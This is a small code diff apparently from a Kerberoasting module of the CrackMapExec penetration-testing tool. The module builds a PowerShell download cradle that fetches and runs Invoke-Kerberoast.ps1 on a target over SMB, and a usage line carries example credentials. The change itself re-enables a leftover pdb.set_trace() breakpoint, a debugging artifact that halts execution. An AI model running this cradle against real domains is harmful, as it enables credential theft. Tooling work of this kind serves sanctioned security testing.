@@ -40,6 +40,7 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
         launcher = gen_ps_iex_cradle(context, 'Invoke-Kerberoast.ps1', command, server_os=connection.server_os)
 
         connection.ps_execute(launcher)
+
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
@@ -65,7 +66,7 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
         if len(data):
             #buf = StringIO(data).readlines()
             lines = data.decode().split("             ")
-            #pdb.set_trace() #stuff = iter(data.decode().split())    for thing in stuff: print(thing) 
+            pdb.set_trace() #stuff = iter(data.decode().split())    for thing in stuff: print(thing) 
             for line in lines:
                 #line = line.replace('\r\n', '\n').strip()
                 context.log.highlight(line)
